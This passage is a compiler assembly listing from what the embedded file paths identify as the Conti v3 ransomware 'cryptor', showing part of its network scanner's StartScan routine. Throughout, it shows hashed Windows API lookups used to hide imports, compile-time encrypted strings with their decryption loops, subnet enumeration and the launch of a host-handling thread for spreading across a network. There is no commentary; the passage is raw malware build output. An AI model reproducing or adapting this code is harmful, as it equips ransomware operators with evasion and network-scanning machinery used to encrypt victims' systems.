  0028e	44 8d 4a 10	 lea	 r9d, QWORD PTR [rdx+16]
  00292	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 846  : 	return pFunction(name, namelen);

  00297	ba 00 01 00 00	 mov	 edx, 256		; 00000100H
  0029c	48 8d 8d 30 02
	00 00		 lea	 rcx, QWORD PTR szHostName$9[rbp-256]
  002a3	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 93   : 	if (SOCKET_ERROR == (INT)pgethostname(szHostName, 256)) {

  002a5	83 f8 ff	 cmp	 eax, -1
  002a8	74 24		 je	 SHORT $LN144@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 835  : 	pFunction = (hostent * (WINAPI*)(const char*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3f6d3769, 38);//GetProcAddress(hWs2_32, OBFA("gethostbyname"));

  002aa	ba 15 00 00 00	 mov	 edx, 21
  002af	41 b8 69 37 6d
	3f		 mov	 r8d, 1064122217		; 3f6d3769H
  002b5	44 8d 4a 11	 lea	 r9d, QWORD PTR [rdx+17]
  002b9	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 836  : 	return pFunction(name);

  002be	48 8d 8d 30 02
	00 00		 lea	 rcx, QWORD PTR szHostName$9[rbp-256]
  002c5	ff d0		 call	 rax
  002c7	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_HostEntry@@3PEAUhostent@@EA, rax ; g_HostEntry
$LN144@StartScan:

; 507  : 	pFunction = (HANDLE(WINAPI*)(HANDLE, HANDLE, ULONG_PTR, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xac9084f4, 65);//GetProcAddress(hKernel32, OBFA("CreateIoCompletionPort"));

  002ce	ba 0f 00 00 00	 mov	 edx, 15
  002d3	41 b8 f4 84 90
	ac		 mov	 r8d, -1399814924	; ac9084f4H
  002d9	44 8d 4a 32	 lea	 r9d, QWORD PTR [rdx+50]
  002dd	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 508  : 	return pFunction(FileHandle, ExistingCompletionPort, CompletionKey, NumberOfConcurrentThreads);

  002e2	33 d2		 xor	 edx, edx
  002e4	45 33 c9	 xor	 r9d, r9d
  002e7	45 33 c0	 xor	 r8d, r8d
  002ea	48 8d 4a ff	 lea	 rcx, QWORD PTR [rdx-1]
  002ee	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 642  : 	g_IocpHandle = pCreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, NULL, 0);

  002f0	48 89 05 00 00
	00 00		 mov	 QWORD PTR ?g_IocpHandle@@3PEAXEA, rax ; g_IocpHandle
  002f7	48 85 c0	 test	 rax, rax

; 643  : 	if (g_IocpHandle == NULL) {

  002fa	0f 85 85 01 00
	00		 jne	 $LN4@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00300	88 5d 20	 mov	 BYTE PTR $T3[rbp-256], bl
  00303	c6 45 21 36	 mov	 BYTE PTR $T3[rbp-255], 54 ; 00000036H
  00307	c6 45 22 3c	 mov	 BYTE PTR $T3[rbp-254], 60 ; 0000003cH
  0030b	c6 45 23 39	 mov	 BYTE PTR $T3[rbp-253], 57 ; 00000039H
  0030f	c6 45 24 3c	 mov	 BYTE PTR $T3[rbp-252], 60 ; 0000003cH
  00313	c6 45 25 47	 mov	 BYTE PTR $T3[rbp-251], 71 ; 00000047H
  00317	c6 45 26 3c	 mov	 BYTE PTR $T3[rbp-250], 60 ; 0000003cH
  0031b	c6 45 27 66	 mov	 BYTE PTR $T3[rbp-249], 102 ; 00000066H
  0031f	c6 45 28 3c	 mov	 BYTE PTR $T3[rbp-248], 60 ; 0000003cH
  00323	c6 45 29 61	 mov	 BYTE PTR $T3[rbp-247], 97 ; 00000061H
  00327	c6 45 2a 3c	 mov	 BYTE PTR $T3[rbp-246], 60 ; 0000003cH
  0032b	c6 45 2b 72	 mov	 BYTE PTR $T3[rbp-245], 114 ; 00000072H
  0032f	c6 45 2c 3c	 mov	 BYTE PTR $T3[rbp-244], 60 ; 0000003cH
  00333	c6 45 2d 6c	 mov	 BYTE PTR $T3[rbp-243], 108 ; 0000006cH
  00337	c6 45 2e 3c	 mov	 BYTE PTR $T3[rbp-242], 60 ; 0000003cH
  0033b	c6 45 2f 2e	 mov	 BYTE PTR $T3[rbp-241], 46 ; 0000002eH
  0033f	c6 45 30 3c	 mov	 BYTE PTR $T3[rbp-240], 60 ; 0000003cH
  00343	c6 45 31 20	 mov	 BYTE PTR $T3[rbp-239], 32 ; 00000020H
  00347	c6 45 32 3c	 mov	 BYTE PTR $T3[rbp-238], 60 ; 0000003cH
  0034b	c6 45 33 39	 mov	 BYTE PTR $T3[rbp-237], 57 ; 00000039H
  0034f	c6 45 34 3c	 mov	 BYTE PTR $T3[rbp-236], 60 ; 0000003cH
  00353	c6 45 35 61	 mov	 BYTE PTR $T3[rbp-235], 97 ; 00000061H
  00357	c6 45 36 3c	 mov	 BYTE PTR $T3[rbp-234], 60 ; 0000003cH
  0035b	c6 45 37 20	 mov	 BYTE PTR $T3[rbp-233], 32 ; 00000020H
  0035f	c6 45 38 3c	 mov	 BYTE PTR $T3[rbp-232], 60 ; 0000003cH
  00363	c6 45 39 72	 mov	 BYTE PTR $T3[rbp-231], 114 ; 00000072H
  00367	c6 45 3a 3c	 mov	 BYTE PTR $T3[rbp-230], 60 ; 0000003cH
  0036b	c6 45 3b 07	 mov	 BYTE PTR $T3[rbp-229], 7
  0036f	c6 45 3c 3c	 mov	 BYTE PTR $T3[rbp-228], 60 ; 0000003cH
  00373	c6 45 3d 21	 mov	 BYTE PTR $T3[rbp-227], 33 ; 00000021H
  00377	c6 45 3e 3c	 mov	 BYTE PTR $T3[rbp-226], 60 ; 0000003cH
  0037b	c6 45 3f 72	 mov	 BYTE PTR $T3[rbp-225], 114 ; 00000072H
  0037f	c6 45 40 3c	 mov	 BYTE PTR $T3[rbp-224], 60 ; 0000003cH
  00383	c6 45 41 6c	 mov	 BYTE PTR $T3[rbp-223], 108 ; 0000006cH
  00387	c6 45 42 3c	 mov	 BYTE PTR $T3[rbp-222], 60 ; 0000003cH
  0038b	c6 45 43 21	 mov	 BYTE PTR $T3[rbp-221], 33 ; 00000021H
  0038f	c6 45 44 3c	 mov	 BYTE PTR $T3[rbp-220], 60 ; 0000003cH
  00393	c6 45 45 6d	 mov	 BYTE PTR $T3[rbp-219], 109 ; 0000006dH
  00397	c6 45 46 3c	 mov	 BYTE PTR $T3[rbp-218], 60 ; 0000003cH
  0039b	c6 45 47 7a	 mov	 BYTE PTR $T3[rbp-217], 122 ; 0000007aH
  0039f	c6 45 48 3c	 mov	 BYTE PTR $T3[rbp-216], 60 ; 0000003cH
  003a3	c6 45 49 14	 mov	 BYTE PTR $T3[rbp-215], 20
  003a7	c6 45 4a 3c	 mov	 BYTE PTR $T3[rbp-214], 60 ; 0000003cH
  003ab	c6 45 4b 20	 mov	 BYTE PTR $T3[rbp-213], 32 ; 00000020H
  003af	c6 45 4c 3c	 mov	 BYTE PTR $T3[rbp-212], 60 ; 0000003cH
  003b3	c6 45 4d 61	 mov	 BYTE PTR $T3[rbp-211], 97 ; 00000061H
  003b7	c6 45 4e 3c	 mov	 BYTE PTR $T3[rbp-210], 60 ; 0000003cH
  003bb	c6 45 4f 07	 mov	 BYTE PTR $T3[rbp-209], 7
  003bf	c6 45 50 3c	 mov	 BYTE PTR $T3[rbp-208], 60 ; 0000003cH
  003c3	c6 45 51 21	 mov	 BYTE PTR $T3[rbp-207], 33 ; 00000021H
  003c7	c6 45 52 3c	 mov	 BYTE PTR $T3[rbp-206], 60 ; 0000003cH
  003cb	c6 45 53 47	 mov	 BYTE PTR $T3[rbp-205], 71 ; 00000047H
  003cf	c6 45 54 3c	 mov	 BYTE PTR $T3[rbp-204], 60 ; 0000003cH
  003d3	c6 45 55 72	 mov	 BYTE PTR $T3[rbp-203], 114 ; 00000072H
  003d7	c6 45 56 3c	 mov	 BYTE PTR $T3[rbp-202], 60 ; 0000003cH
  003db	c6 45 57 7a	 mov	 BYTE PTR $T3[rbp-201], 122 ; 0000007aH
  003df	c6 45 58 3c	 mov	 BYTE PTR $T3[rbp-200], 60 ; 0000003cH
  003e3	c6 45 59 21	 mov	 BYTE PTR $T3[rbp-199], 33 ; 00000021H
  003e7	c6 45 5a 3c	 mov	 BYTE PTR $T3[rbp-198], 60 ; 0000003cH
  003eb	c6 45 5b 2e	 mov	 BYTE PTR $T3[rbp-197], 46 ; 0000002eH
  003ef	c6 45 5c 3c	 mov	 BYTE PTR $T3[rbp-196], 60 ; 0000003cH
  003f3	c6 45 5d 61	 mov	 BYTE PTR $T3[rbp-195], 97 ; 00000061H
  003f7	c6 45 5e 3c	 mov	 BYTE PTR $T3[rbp-194], 60 ; 0000003cH
  003fb	c6 45 5f 5a	 mov	 BYTE PTR $T3[rbp-193], 90 ; 0000005aH
  003ff	c6 45 60 3c	 mov	 BYTE PTR $T3[rbp-192], 60 ; 0000003cH
  00403	c6 45 61 3c	 mov	 BYTE PTR $T3[rbp-191], 60 ; 0000003cH
  00407	c6 45 62 3c	 mov	 BYTE PTR $T3[rbp-190], 60 ; 0000003cH
  0040b	0f b6 45 21	 movzx	 eax, BYTE PTR $T3[rbp-255]

; 58   :         return m_isDecrypted;

  0040f	0f b6 45 20	 movzx	 eax, BYTE PTR $T3[rbp-256]

; 63   :         if (!isDecrypted())

  00413	84 c0		 test	 al, al
  00415	75 60		 jne	 SHORT $LN294@StartScan
  00417	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL295@StartScan:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00420	0f b6 4c 1d 21	 movzx	 ecx, BYTE PTR $T3[rbp+rbx-255]

; 40   :     return (a % n + n) % n;

  00425	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0042a	83 e9 3c	 sub	 ecx, 60			; 0000003cH
  0042d	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00431	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  00434	41 f7 e8	 imul	 r8d
  00437	41 03 d0	 add	 edx, r8d
  0043a	c1 fa 06	 sar	 edx, 6
  0043d	8b c2		 mov	 eax, edx
  0043f	c1 e8 1f	 shr	 eax, 31
  00442	03 d0		 add	 edx, eax
  00444	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00447	44 2b c0	 sub	 r8d, eax
  0044a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0044f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00453	41 f7 e8	 imul	 r8d
  00456	41 03 d0	 add	 edx, r8d
  00459	c1 fa 06	 sar	 edx, 6
  0045c	8b c2		 mov	 eax, edx
  0045e	c1 e8 1f	 shr	 eax, 31
  00461	03 d0		 add	 edx, eax
  00463	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00466	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00469	44 88 44 1d 21	 mov	 BYTE PTR $T3[rbp+rbx-255], r8b
  0046e	48 ff c3	 inc	 rbx
  00471	48 83 fb 42	 cmp	 rbx, 66			; 00000042H
  00475	72 a9		 jb	 SHORT $LL295@StartScan
$LN294@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 645  : 		logs::Write(OBFW(L"Can't create io completion port."));

  00477	48 8d 4d 21	 lea	 rcx, QWORD PTR $T3[rbp-255]
  0047b	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 681  : 	pWaitForSingleObject(hHostHandler, INFINITE);
; 682  : 
; 683  : cleanup:

  00480	e9 04 05 00 00	 jmp	 $cleanup$1121
$LN4@StartScan:

; 646  : 		goto cleanup;
; 647  : 
; 648  : 	}
; 649  : 
; 650  : 	TAILQ_INIT(&g_SubnetList);
; 651  : 	TAILQ_INIT(&g_HostList);

  00485	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_HostList@@3Uhost_list_@@A ; g_HostList
  0048c	48 89 1d 00 00
	00 00		 mov	 QWORD PTR ?g_SubnetList@@3Usubnet_list_@@A, rbx
  00493	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_HostList@@3Uhost_list_@@A+8, rax
  0049a	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_SubnetList@@3Usubnet_list_@@A ; g_SubnetList

; 652  : 	TAILQ_INIT(&g_ConnectionList);

  004a1	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:?g_ConnectionList@@3Uconnection_list_@@A ; g_ConnectionList
  004a8	48 89 0d 08 00
	00 00		 mov	 QWORD PTR ?g_SubnetList@@3Usubnet_list_@@A+8, rcx
  004af	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8, rax
  004b6	48 89 1d 00 00
	00 00		 mov	 QWORD PTR ?g_HostList@@3Uhost_list_@@A, rbx
  004bd	48 89 1d 00 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A, rbx

; 653  : 
; 654  : 	if (!GetSubnets(&g_SubnetList)) {

  004c4	e8 00 00 00 00	 call	 ?GetSubnets@@YAHPEAUsubnet_list_@@@Z ; GetSubnets
  004c9	85 c0		 test	 eax, eax
  004cb	0f 85 2e 01 00
	00		 jne	 $LN15@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  004d1	88 5c 24 50	 mov	 BYTE PTR $T4[rsp], bl
  004d5	c6 44 24 51 64	 mov	 BYTE PTR $T4[rsp+1], 100 ; 00000064H
  004da	c6 44 24 52 53	 mov	 BYTE PTR $T4[rsp+2], 83	; 00000053H
  004df	c6 44 24 53 1c	 mov	 BYTE PTR $T4[rsp+3], 28
  004e4	c6 44 24 54 53	 mov	 BYTE PTR $T4[rsp+4], 83	; 00000053H
  004e9	c6 44 24 55 49	 mov	 BYTE PTR $T4[rsp+5], 73	; 00000049H
  004ee	c6 44 24 56 53	 mov	 BYTE PTR $T4[rsp+6], 83	; 00000053H
  004f3	c6 44 24 57 5b	 mov	 BYTE PTR $T4[rsp+7], 91	; 0000005bH
  004f8	c6 44 24 58 53	 mov	 BYTE PTR $T4[rsp+8], 83	; 00000053H
  004fd	c6 44 24 59 54	 mov	 BYTE PTR $T4[rsp+9], 84	; 00000054H
  00502	c6 44 24 5a 53	 mov	 BYTE PTR $T4[rsp+10], 83 ; 00000053H
  00507	c6 44 24 5b 39	 mov	 BYTE PTR $T4[rsp+11], 57 ; 00000039H
  0050c	c6 44 24 5c 53	 mov	 BYTE PTR $T4[rsp+12], 83 ; 00000053H
  00511	c6 44 24 5d 27	 mov	 BYTE PTR $T4[rsp+13], 39 ; 00000027H
  00516	c6 44 24 5e 53	 mov	 BYTE PTR $T4[rsp+14], 83 ; 00000053H
  0051b	c6 44 24 5f 78	 mov	 BYTE PTR $T4[rsp+15], 120 ; 00000078H
  00520	c6 44 24 60 53	 mov	 BYTE PTR $T4[rsp+16], 83 ; 00000053H
  00525	c6 44 24 61 54	 mov	 BYTE PTR $T4[rsp+17], 84 ; 00000054H
  0052a	c6 44 24 62 53	 mov	 BYTE PTR $T4[rsp+18], 83 ; 00000053H
  0052f	c6 44 24 63 39	 mov	 BYTE PTR $T4[rsp+19], 57 ; 00000039H
  00534	c6 44 24 64 53	 mov	 BYTE PTR $T4[rsp+20], 83 ; 00000053H
  00539	c6 44 24 65 3d	 mov	 BYTE PTR $T4[rsp+21], 61 ; 0000003dH
  0053e	c6 44 24 66 53	 mov	 BYTE PTR $T4[rsp+22], 83 ; 00000053H
  00543	c6 44 24 67 6b	 mov	 BYTE PTR $T4[rsp+23], 107 ; 0000006bH
  00548	c6 44 24 68 53	 mov	 BYTE PTR $T4[rsp+24], 83 ; 00000053H
  0054d	c6 44 24 69 33	 mov	 BYTE PTR $T4[rsp+25], 51 ; 00000033H
  00552	c6 44 24 6a 53	 mov	 BYTE PTR $T4[rsp+26], 83 ; 00000053H
  00557	c6 44 24 6b 49	 mov	 BYTE PTR $T4[rsp+27], 73 ; 00000049H
  0055c	c6 44 24 6c 53	 mov	 BYTE PTR $T4[rsp+28], 83 ; 00000053H
  00561	c6 44 24 6d 78	 mov	 BYTE PTR $T4[rsp+29], 120 ; 00000078H
  00566	c6 44 24 6e 53	 mov	 BYTE PTR $T4[rsp+30], 83 ; 00000053H
  0056b	c6 44 24 6f 54	 mov	 BYTE PTR $T4[rsp+31], 84 ; 00000054H
  00570	c6 44 24 70 53	 mov	 BYTE PTR $T4[rsp+32], 83 ; 00000053H
  00575	c6 44 24 71 3d	 mov	 BYTE PTR $T4[rsp+33], 61 ; 0000003dH
  0057a	c6 44 24 72 53	 mov	 BYTE PTR $T4[rsp+34], 83 ; 00000053H
  0057f	c6 44 24 73 7d	 mov	 BYTE PTR $T4[rsp+35], 125 ; 0000007dH
  00584	c6 44 24 74 53	 mov	 BYTE PTR $T4[rsp+36], 83 ; 00000053H
  00589	c6 44 24 75 53	 mov	 BYTE PTR $T4[rsp+37], 83 ; 00000053H
  0058e	c6 44 24 76 53	 mov	 BYTE PTR $T4[rsp+38], 83 ; 00000053H
  00593	0f b6 44 24 51	 movzx	 eax, BYTE PTR $T4[rsp+1]

; 58   :         return m_isDecrypted;

  00598	0f b6 44 24 50	 movzx	 eax, BYTE PTR $T4[rsp]

; 63   :         if (!isDecrypted())

  0059d	84 c0		 test	 al, al
  0059f	75 4f		 jne	 SHORT $LN807@StartScan
$LL808@StartScan:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005a1	0f b6 4c 1c 51	 movzx	 ecx, BYTE PTR $T4[rsp+rbx+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  005a6	b8 53 00 00 00	 mov	 eax, 83			; 00000053H
  005ab	2b c1		 sub	 eax, ecx
  005ad	6b c8 0b	 imul	 ecx, eax, 11

; 40   :     return (a % n + n) % n;

  005b0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005b5	f7 e9		 imul	 ecx
  005b7	03 d1		 add	 edx, ecx
  005b9	c1 fa 06	 sar	 edx, 6
  005bc	8b c2		 mov	 eax, edx
  005be	c1 e8 1f	 shr	 eax, 31
  005c1	03 d0		 add	 edx, eax
  005c3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005c6	2b c8		 sub	 ecx, eax
  005c8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  005cd	83 c1 7f	 add	 ecx, 127		; 0000007fH
  005d0	f7 e9		 imul	 ecx
  005d2	03 d1		 add	 edx, ecx
  005d4	c1 fa 06	 sar	 edx, 6
  005d7	8b c2		 mov	 eax, edx
  005d9	c1 e8 1f	 shr	 eax, 31
  005dc	03 d0		 add	 edx, eax
  005de	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  005e1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  005e3	88 4c 1c 51	 mov	 BYTE PTR $T4[rsp+rbx+1], cl
  005e7	48 ff c3	 inc	 rbx
  005ea	48 83 fb 26	 cmp	 rbx, 38			; 00000026H
  005ee	72 b1		 jb	 SHORT $LL808@StartScan
$LN807@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 656  : 		logs::Write(OBFW(L"Can't get subnets."));

  005f0	48 8d 4c 24 51	 lea	 rcx, QWORD PTR $T4[rsp+1]
  005f5	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 681  : 	pWaitForSingleObject(hHostHandler, INFINITE);
; 682  : 
; 683  : cleanup:

  005fa	e9 8a 03 00 00	 jmp	 $cleanup$1121
$LN15@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  005ff	ba 0f 00 00 00	 mov	 edx, 15
  00604	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  0060a	44 8d 4a 43	 lea	 r9d, QWORD PTR [rdx+67]
  0060e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  00613	45 33 c9	 xor	 r9d, r9d
  00616	48 89 5c 24 28	 mov	 QWORD PTR [rsp+40], rbx
  0061b	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?HostHandler@@YAKPEAX@Z ; HostHandler
  00622	89 5c 24 20	 mov	 DWORD PTR [rsp+32], ebx
  00626	33 d2		 xor	 edx, edx
  00628	33 c9		 xor	 ecx, ecx
  0062a	ff d0		 call	 rax
  0062c	48 8b f0	 mov	 rsi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 662  : 	if (hHostHandler == INVALID_HANDLE_VALUE) {

  0062f	48 83 f8 ff	 cmp	 rax, -1
  00633	0f 85 44 01 00
	00		 jne	 $LN17@StartScan
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00639	88 5d a8	 mov	 BYTE PTR $T5[rbp-256], bl
  0063c	c6 45 a9 03	 mov	 BYTE PTR $T5[rbp-255], 3
  00640	c6 45 aa 5c	 mov	 BYTE PTR $T5[rbp-254], 92 ; 0000005cH
  00644	c6 45 ab 6f	 mov	 BYTE PTR $T5[rbp-253], 111 ; 0000006fH
  00648	c6 45 ac 5c	 mov	 BYTE PTR $T5[rbp-252], 92 ; 0000005cH
  0064c	c6 45 ad 6b	 mov	 BYTE PTR $T5[rbp-251], 107 ; 0000006bH
  00650	c6 45 ae 5c	 mov	 BYTE PTR $T5[rbp-250], 92 ; 0000005cH
  00654	c6 45 af 50	 mov	 BYTE PTR $T5[rbp-249], 80 ; 00000050H
  00658	c6 45 b0 5c	 mov	 BYTE PTR $T5[rbp-248], 92 ; 0000005cH
  0065c	c6 45 b1 1b	 mov	 BYTE PTR $T5[rbp-247], 27
  00660	c6 45 b2 5c	 mov	 BYTE PTR $T5[rbp-246], 92 ; 0000005cH
  00664	c6 45 b3 04	 mov	 BYTE PTR $T5[rbp-245], 4
  00668	c6 45 b4 5c	 mov	 BYTE PTR $T5[rbp-244], 92 ; 0000005cH
  0066c	c6 45 b5 2a	 mov	 BYTE PTR $T5[rbp-243], 42 ; 0000002aH
  00670	c6 45 b6 5c	 mov	 BYTE PTR $T5[rbp-242], 92 ; 0000005cH
  00674	c6 45 b7 60	 mov	 BYTE PTR $T5[rbp-241], 96 ; 00000060H
  00678	c6 45 b8 5c	 mov	 BYTE PTR $T5[rbp-240], 92 ; 0000005cH
  0067c	c6 45 b9 64	 mov	 BYTE PTR $T5[rbp-239], 100 ; 00000064H
  00680	c6 45 ba 5c	 mov	 BYTE PTR $T5[rbp-238], 92 ; 0000005cH
  00684	c6 45 bb 6f	 mov	 BYTE PTR $T5[rbp-237], 111 ; 0000006fH
  00688	c6 45 bc 5c	 mov	 BYTE PTR $T5[rbp-236], 92 ; 0000005cH
  0068c	c6 45 bd 1b	 mov	 BYTE PTR $T5[rbp-235], 27
  00690	c6 45 be 5c	 mov	 BYTE PTR $T5[rbp-234], 92 ; 0000005cH
  00694	c6 45 bf 64	 mov	 BYTE PTR $T5[rbp-233], 100 ; 00000064H
  00698	c6 45 c0 5c	 mov	 BYTE PTR $T5[rbp-232], 92 ; 0000005cH
  0069c	c6 45 c1 04	 mov	 BYTE PTR $T5[rbp-231], 4
  006a0	c6 45 c2 5c	 mov	 BYTE PTR $T5[rbp-230], 92 ; 0000005cH
  006a4	c6 45 c3 3c	 mov	 BYTE PTR $T5[rbp-229], 60 ; 0000003cH
  006a8	c6 45 c4 5c	 mov	 BYTE PTR $T5[rbp-228], 92 ; 0000005cH
  006ac	c6 45 c5 09	 mov	 BYTE PTR $T5[rbp-227], 9
  006b0	c6 45 c6 5c	 mov	 BYTE PTR $T5[rbp-226], 92 ; 0000005cH
  006b4	c6 45 c7 7d	 mov	 BYTE PTR $T5[rbp-225], 125 ; 0000007dH
  006b8	c6 45 c8 5c	 mov	 BYTE PTR $T5[rbp-224], 92 ; 0000005cH
  006bc	c6 45 c9 1b	 mov	 BYTE PTR $T5[rbp-223], 27
  006c0	c6 45 ca 5c	 mov	 BYTE PTR $T5[rbp-222], 92 ; 0000005cH
  006c4	c6 45 cb 04	 mov	 BYTE PTR $T5[rbp-221], 4
  006c8	c6 45 cc 5c	 mov	 BYTE PTR $T5[rbp-220], 92 ; 0000005cH
  006cc	c6 45 cd 1b	 mov	 BYTE PTR $T5[rbp-219], 27
  006d0	c6 45 ce 5c	 mov	 BYTE PTR $T5[rbp-218], 92 ; 0000005cH
  006d4	c6 45 cf 3c	 mov	 BYTE PTR $T5[rbp-217], 60 ; 0000003cH
  006d8	c6 45 d0 5c	 mov	 BYTE PTR $T5[rbp-216], 92 ; 0000005cH
  006dc	c6 45 d1 60	 mov	 BYTE PTR $T5[rbp-215], 96 ; 00000060H
  006e0	c6 45 d2 5c	 mov	 BYTE PTR $T5[rbp-214], 92 ; 0000005cH
  006e4	c6 45 d3 64	 mov	 BYTE PTR $T5[rbp-213], 100 ; 00000064H
  006e8	c6 45 d4 5c	 mov	 BYTE PTR $T5[rbp-212], 92 ; 0000005cH
  006ec	c6 45 d5 6f	 mov	 BYTE PTR $T5[rbp-211], 111 ; 0000006fH
  006f0	c6 45 d6 5c	 mov	 BYTE PTR $T5[rbp-210], 92 ; 0000005cH
  006f4	c6 45 d7 47	 mov	 BYTE PTR $T5[rbp-209], 71 ; 00000047H
  006f8	c6 45 d8 5c	 mov	 BYTE PTR $T5[rbp-208], 92 ; 0000005cH
  006fc	c6 45 d9 1d	 mov	 BYTE PTR $T5[rbp-207], 29
  00700	c6 45 da 5c	 mov	 BYTE PTR $T5[rbp-206], 92 ; 0000005cH
  00704	c6 45 db 5c	 mov	 BYTE PTR $T5[rbp-205], 92 ; 0000005cH
  00708	c6 45 dc 5c	 mov	 BYTE PTR $T5[rbp-204], 92 ; 0000005cH
  0070c	0f b6 45 a9	 movzx	 eax, BYTE PTR $T5[rbp-255]

; 58   :         return m_isDecrypted;

  00710	0f b6 45 a8	 movzx	 eax, BYTE PTR $T5[rbp-256]

; 63   :         if (!isDecrypted())

  00714	84 c0		 test	 al, al
  00716	75 57		 jne	 SHORT $LN927@StartScan
  00718	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL928@StartScan:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00720	0f b6 4c 1d a9	 movzx	 ecx, BYTE PTR $T5[rbp+rbx-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00725	b8 5c 00 00 00	 mov	 eax, 92			; 0000005cH
  0072a	2b c1		 sub	 eax, ecx
  0072c	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  0072f	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00734	f7 e9		 imul	 ecx
  00736	03 d1		 add	 edx, ecx
  00738	c1 fa 06	 sar	 edx, 6
  0073b	8b c2		 mov	 eax, edx
  0073d	c1 e8 1f	 shr	 eax, 31
  00740	03 d0		 add	 edx, eax
  00742	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00745	2b c8		 sub	 ecx, eax
  00747	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0074c	83 c1 7f	 add	 ecx, 127		; 0000007fH
  0074f	f7 e9		 imul	 ecx
  00751	03 d1		 add	 edx, ecx
  00753	c1 fa 06	 sar	 edx, 6
  00756	8b c2		 mov	 eax, edx
  00758	c1 e8 1f	 shr	 eax, 31
  0075b	03 d0		 add	 edx, eax
  0075d	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00760	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00762	88 4c 1d a9	 mov	 BYTE PTR $T5[rbp+rbx-255], cl
  00766	48 ff c3	 inc	 rbx
  00769	48 83 fb 34	 cmp	 rbx, 52			; 00000034H
  0076d	72 b1		 jb	 SHORT $LL928@StartScan
$LN927@StartScan:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

